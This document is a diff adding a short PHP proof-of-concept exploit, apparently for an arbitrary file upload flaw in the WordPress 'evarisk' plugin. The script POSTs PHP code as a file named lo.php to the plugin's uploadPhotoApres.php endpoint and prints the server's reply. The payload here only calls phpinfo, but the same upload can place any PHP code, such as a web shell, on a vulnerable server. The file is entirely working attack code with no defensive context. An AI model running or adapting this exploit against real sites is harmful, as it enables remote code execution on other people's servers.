@@ -1,0 +1,16 @@
+<?php
+
+$headers = array("Content-Type: application/octet-stream");
+
+$uploadfile="<?php phpinfo(); ?>";
+ 
+$ch = curl_init("http://www.example.com/wordpress/wp-content/plugins/evarisk/include/lib/actionsCorrectives/activite/uploadPhotoApres.php?qqfile=lo.php");
+curl_setopt($ch, CURLOPT_POST, true);   
+curl_setopt($ch, CURLOPT_POSTFIELDS, @$uploadfile);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
